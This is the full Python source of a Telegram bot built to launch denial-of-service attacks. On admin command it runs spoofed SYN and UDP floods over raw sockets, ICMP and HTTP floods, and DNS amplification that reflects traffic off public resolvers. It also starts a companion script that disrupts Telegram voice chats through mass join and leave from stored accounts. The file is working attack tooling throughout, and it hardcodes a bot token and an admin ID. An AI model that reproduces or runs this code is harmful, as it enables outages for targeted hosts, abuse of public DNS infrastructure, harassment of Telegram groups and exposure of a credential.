#!/usr/bin/env python3
"""
TG-DDOS-BOT — packet floods + Telegram VC disruption.
Requires: pip install pyTelegramBotAPI
Run as:   sudo -E python3 -m app

Commands:
  /attack <method> <ip> [port] [threads]   — packet flood
  /vc <group> [cycles]                     — Telegram VC join/leave disrupt
  /vcstop                                  — stop VC disrupt
  /stop <key>                              — stop one attack
  /stopall                                 — stop everything
  /active                                  — list running attacks
  /methods                                 — list methods
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess
from pathlib import Path

import telebot
from telebot import types

# ─────────────────────────────────────────────────────────────
# CONFIG — reads env vars first, falls back to literals
# ─────────────────────────────────────────────────────────────
TOKEN = os.environ.get("TG_BOT_TOKEN", "8266935484:AAGAId0vxFKzyXIUGFmZ05K5k118gduKNLw")
ADMIN_IDS = {int(x) for x in os.environ.get("TG_ADMIN_IDS", "8789271943").split(",") if x}

STOP_EVENTS = {}
ACTIVE_THREADS = {}
STATE_LOCK = threading.Lock()

# VC disruption subprocess handle
VC_PROC = {"proc": None, "target": None, "started": 0.0}
VC_LOCK = threading.Lock()

bot = telebot.TeleBot(TOKEN)


# ─────────────────────────────────────────────────────────────
# AUTH
# ─────────────────────────────────────────────────────────────
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS


def admin_only(func):
    def wrapper(message, *args, **kwargs):
        if not is_admin(message.from_user.id):
            bot.send_message(message.chat.id, "⛔ unauthorized")
            return
        return func(message, *args, **kwargs)
    return wrapper


# ─────────────────────────────────────────────────────────────
# VALIDATION
# ─────────────────────────────────────────────────────────────
def is_valid_ip(s: str) -> bool:
    try:
        socket.inet_aton(s)
        return s.count(".") == 3
    except OSError:
        return False


def resolve_target(target: str):
    target = target.strip().replace("http://", "").replace("https://", "")
    target = target.split("/")[0]
    if ":" in target:
        target = target.split(":")[0]
    if is_valid_ip(target):
        return target, target
    try:
        ip = socket.gethostbyname(target)
        return ip, target
    except socket.gaierror:
        return None, None


# ─────────────────────────────────────────────────────────────
# RAW SOCKET HELPERS
# ─────────────────────────────────────────────────────────────
def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def random_ip() -> str:
    while True:
        ip = socket.inet_ntoa(struct.pack("!I", random.getrandbits(32)))
        a, b, _, _ = map(int, ip.split("."))
        if a in (0, 10, 127): continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        return ip


def build_ip_header(src_ip, dst_ip, proto, payload_len):
    ihl = 5
    ver = 4
    tot = 20 + payload_len
    ip_id = random.randint(0, 65535)
    ttl = 64
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, 0,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    chk = checksum(hdr)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        (ver << 4) + ihl, 0, tot, ip_id, 0, ttl, proto, chk,
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
    )
    return hdr


# ─────────────────────────────────────────────────────────────
# PACKET ATTACKS
# ─────────────────────────────────────────────────────────────
def syn_flood(dst_ip, dst_port, stop_event, stats):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp = struct.pack(
                "!HHIIBBHHH",
                src_port, dst_port, seq, 0,
                (5 << 4), 0x02, 64240, 0, 0,
            )
            ip = build_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp))
            try:
                sock.sendto(ip + tcp, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] syn_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] syn_flood: {e}", file=sys.stderr)


def udp_flood(dst_ip, dst_port, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            src_ip = random_ip()
            src_port = random.randint(1024, 65535)
            payload = os.urandom(size)
            udp_len = 8 + len(payload)
            udp = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
            ip = build_ip_header(src_ip, dst_ip, socket.IPPROTO_UDP, len(udp) + len(payload))
            try:
                sock.sendto(ip + udp + payload, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] udp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] udp_flood: {e}", file=sys.stderr)


def icmp_flood(dst_ip, stop_event, stats, size=1400):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while not stop_event.is_set():
            payload = os.urandom(size)
            icmp_type = 8
            code = 0
            id_ = random.randint(0, 65535)
            seq = random.randint(0, 65535)
            hdr = struct.pack("!BBHHH", icmp_type, code, 0, id_, seq)
            chksum = checksum(hdr + payload)
            hdr = struct.pack("!BBHHH", icmp_type, code, chksum, id_, seq)
            try:
                sock.sendto(hdr + payload, (dst_ip, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] icmp_flood needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] icmp_flood: {e}", file=sys.stderr)


def http_flood(host, port, stop_event, stats, path="/"):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    ]
    while not stop_event.is_set():
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((host, port))
            ua = random.choice(user_agents)
            req = (
                f"GET {path}?{random.randint(0, 999999)} HTTP/1.1\r\n"
                f"Host: {host}\r\nUser-Agent: {ua}\r\n"
                f"Accept: */*\r\nConnection: close\r\n\r\n"
            )
            s.send(req.encode())
            try:
                s.recv(1024)
            except Exception:
                pass
            s.close()
            stats["pkts"] += 1
        except Exception:
            time.sleep(0.05)


def dns_amplification(dst_ip, stop_event, stats, resolvers=None, domain="isc.org"):
    if resolvers is None:
        resolvers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "64.6.64.6", "208.67.222.222",
        ]
    tid = random.randint(0, 65535)
    flags = 0x0100
    header = struct.pack("!HHHHHH", tid, flags, 1, 0, 0, 0)
    q = b""
    for part in domain.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00" + struct.pack("!HH", 255, 1)
    dns_query = header + q

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while not stop_event.is_set():
            resolver = random.choice(resolvers)
            src_port = random.randint(1024, 65535)
            udp_len = 8 + len(dns_query)
            udp = struct.pack("!HHHH", src_port, 53, udp_len, 0)
            ip = build_ip_header(dst_ip, resolver, socket.IPPROTO_UDP, udp_len)
            try:
                sock.sendto(ip + udp + dns_query, (resolver, 0))
                stats["pkts"] += 1
            except OSError:
                pass
    except PermissionError:
        print("[!] dns_amp needs root", file=sys.stderr)
    except Exception as e:
        print(f"[!] dns_amp: {e}", file=sys.stderr)


# ─────────────────────────────────────────────────────────────
# ATTACK REGISTRY + MANAGER
# ─────────────────────────────────────────────────────────────
ATTACKS = {
    "syn":  ("SYN Flood (raw, spoofed)",    "layer4", "needs port"),
    "udp":  ("UDP Flood (raw, spoofed)",    "layer4", "needs port"),
    "icmp": ("ICMP Flood",                  "layer3", "no port"),
    "http": ("HTTP Flood (GET)",            "layer7", "needs port"),
    "dns":  ("DNS Amplification (spoofed)", "amplif", "no port (target = spoofed source)"),
}

METHODS_HELP = """Methods:
  syn  <ip> <port>    TCP SYN flood (raw, spoofed)
  udp  <ip> <port>    UDP flood (raw, spoofed)
  icmp <ip>           ICMP echo flood
  http <host> <port>  HTTP GET flood
  dns  <ip>           DNS amplification (spoofed source)"""


def launch(method, ip, port, threads, chat_id):
    key = f"{chat_id}:{method}:{ip}:{port}"
    with STATE_LOCK:
        if key in STOP_EVENTS:
            return None, "already running"
        stop_event = threading.Event()
        STOP_EVENTS[key] = stop_event
        stats = {"pkts": 0, "start": time.time(), "threads": threads}

    def worker(i):
        if method == "syn":
            syn_flood(ip, port, stop_event, stats)
        elif method == "udp":
            udp_flood(ip, port, stop_event, stats)
        elif method == "icmp":
            icmp_flood(ip, stop_event, stats)
        elif method == "http":
            http_flood(ip, port, stop_event, stats)
        elif method == "dns":
            dns_amplification(ip, stop_event, stats)

    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ACTIVE_THREADS.setdefault(key, []).append(t)

    return key, None


def stop(key):
    with STATE_LOCK:
        ev = STOP_EVENTS.pop(key, None)
        ACTIVE_THREADS.pop(key, [])
    if ev:
        ev.set()
    return ev is not None


def stop_all():
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())
    for k in keys:
        stop(k)
    return keys


# ─────────────────────────────────────────────────────────────
# TELEGRAM HANDLERS
# ─────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
@admin_only
def cmd_start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📋 Methods", "📊 Active")
    markup.row("🛑 Stop All")
    bot.send_message(
        message.chat.id,
        "TG-DDOS Bot ready.\n\n"
        "Packet floods:\n"
        "  /attack <method> <ip> [port] [threads]\n"
        "Telegram VC disrupt:\n"
        "  /vc <group> [cycles]   — mass join/leave\n"
        "  /vcstop                — stop VC disrupt\n"
        "Other:\n"
        "  /stop <key>  /stopall  /active  /methods\n\n"
        + METHODS_HELP,
        reply_markup=markup,
    )


@bot.message_handler(commands=["methods"])
@admin_only
def cmd_methods(message):
    lines = ["<b>Methods</b>"]
    for name, (desc, layer, note) in ATTACKS.items():
        lines.append(f"<code>{name:5}</code> {desc}  [{layer}]  {note}")
    lines.append("")
    lines.append("<b>VC</b> — /vc &lt;group&gt; [cycles] (uses vcdisrupt.py)")
    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["attack"])
@admin_only
def cmd_attack(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.send_message(message.chat.id, "usage: /attack <method> <target> [port] [threads]\n" + METHODS_HELP)
        return

    method = parts[1].lower()
    if method not in ATTACKS:
        bot.send_message(message.chat.id, f"unknown method: {method}")
        return

    target = parts[2]
    port = 80
    threads = 20

    if method in ("syn", "udp", "http"):
        if len(parts) < 4:
            bot.send_message(message.chat.id, f"{method} needs a port")
            return
        try:
            port = int(parts[3])
        except ValueError:
            bot.send_message(message.chat.id, "port must be integer")
            return
    if len(parts) >= 5:
        try:
            threads = max(1, min(200, int(parts[4])))
        except ValueError:
            pass

    ip, host = resolve_target(target)
    if not ip:
        bot.send_message(message.chat.id, f"cannot resolve: {target}")
        return

    key, err = launch(method, ip, port, threads, message.chat.id)
    if err:
        bot.send_message(message.chat.id, f"error: {err}")
        return

    bot.send_message(
        message.chat.id,
        f"🚀 {method} → {ip}:{port}  threads={threads}\nkey: <code>{key}</code>",
        parse_mode="HTML",
    )


# ─── VC DISRUPT (shells out to vcdisrupt.py) ─────────────────
@bot.message_handler(commands=["vc"])
@admin_only
def cmd_vc(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.send_message(
            message.chat.id,
            "usage: /vc <group_or_invite> [cycles]\n"
            "example: /vc @somegroup 30\n"
            "example: /vc https://t.me/+AbCdEf 20\n\n"
            "Requires: vcdisrupt.py in the same folder, sessions/ with accounts."
        )
        return

    target = parts[1]
    cycles = int(parts[2]) if len(parts) > 2 else 30

    script = Path("vcdisrupt.py")
    if not script.exists():
        bot.send_message(message.chat.id, "vcdisrupt.py not found in this folder")
        return
    sessions_dir = Path("sessions")
    if not sessions_dir.exists() or not list(sessions_dir.glob("*.session")):
        bot.send_message(message.chat.id, "no sessions in sessions/ — add accounts first")
        return

    with VC_LOCK:
        if VC_PROC["proc"] and VC_PROC["proc"].poll() is None:
            bot.send_message(message.chat.id, "VC disrupt already running — /vcstop first")
            return

        log_path = Path("logs") / "vc_subprocess.log"
        log_path.parent.mkdir(exist_ok=True)
        log_file = open(log_path, "w")

        cmd = [sys.executable, "-u", str(script), "--target", target, "--cycles", str(cycles)]
        try:
            proc = subprocess.Popen(
                cmd,
                stdout=log_file,
                stderr=subprocess.STDOUT,
                cwd=str(Path.cwd()),
            )
        except Exception as e:
            bot.send_message(message.chat.id, f"failed to launch: {e}")
            return

        VC_PROC["proc"] = proc
        VC_PROC["target"] = target
        VC_PROC["started"] = time.time()

    bot.send_message(
        message.chat.id,
        f"🎙 VC disrupt launched\n"
        f"target: <code>{target}</code>\n"
        f"cycles: {cycles}\n"
        f"pid: {proc.pid}\n"
        f"log: {log_path}\n\n"
        f"use /vcstop to stop",
        parse_mode="HTML",
    )


@bot.message_handler(commands=["vcstop"])
@admin_only
def cmd_vcstop(message):
    with VC_LOCK:
        proc = VC_PROC.get("proc")
        if not proc or proc.poll() is not None:
            bot.send_message(message.chat.id, "no VC disrupt running")
            return
        try:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        except Exception as e:
            bot.send_message(message.chat.id, f"kill error: {e}")
        VC_PROC["proc"] = None

    bot.send_message(message.chat.id, "🛑 VC disrupt stopped")


# ─── Other ───────────────────────────────────────────────────
@bot.message_handler(commands=["active"])
@admin_only
def cmd_active(message):
    lines = []
    with STATE_LOCK:
        keys = list(STOP_EVENTS.keys())

    if keys:
        lines.append("<b>Packet attacks</b>")
        for k in keys:
            lines.append(f"<code>{k}</code>")

    with VC_LOCK:
        proc = VC_PROC.get("proc")
        if proc and proc.poll() is None:
            elapsed = time.time() - VC_PROC["started"]
            lines.append(f"\n<b>VC disrupt</b>")
            lines.append(f"<code>{VC_PROC['target']}</code> pid={proc.pid} age={elapsed:.0f}s")

    if not lines:
        bot.send_message(message.chat.id, "nothing running")
        return

    bot.send_message(message.chat.id, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["stop"])
@admin_only
def cmd_stop(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "usage: /stop <key>")
        return
    ok = stop(parts[1].strip())
    bot.send_message(message.chat.id, "stopped" if ok else "key not found")


@bot.message_handler(commands=["stopall"])
@admin_only
def cmd_stopall(message):
    keys = stop_all()
    with VC_LOCK:
        proc = VC_PROC.get("proc")
        vc_stopped = False
        if proc and proc.poll() is None:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
            VC_PROC["proc"] = None
            vc_stopped = True
    bot.send_message(
        message.chat.id,
        f"stopped {len(keys)} packet attacks" + (", 1 VC disrupt" if vc_stopped else "")
    )


@bot.message_handler(func=lambda m: m.text == "📋 Methods")
@admin_only
def kb_methods(message):
    cmd_methods(message)


@bot.message_handler(func=lambda m: m.text == "📊 Active")
@admin_only
def kb_active(message):
    cmd_active(message)


@bot.message_handler(func=lambda m: m.text == "🛑 Stop All")
@admin_only
def kb_stopall(message):
    cmd_stopall(message)


# ─────────────────────────────────────────────────────────────
# ENTRY
# ─────────────────────────────────────────────────────────────
def main():
    if not ADMIN_IDS or ADMIN_IDS == {0}:
        print("[!] set TG_ADMIN_IDS")
        sys.exit(1)
    if TOKEN in ("YOUR_TOKEN_HERE", "PASTE_NEW_TOKEN_HERE"):
        print("[!] set TG_BOT_TOKEN")
        sys.exit(1)
    if os.geteuid() != 0:
        print("[!] WARNING: not root — raw socket attacks will fail")

    print(f"[*] starting bot — admins: {ADMIN_IDS}")
    bot.infinity_polling(timeout=30, long_polling_timeout=25)


if __name__ == "__main__":
    main()
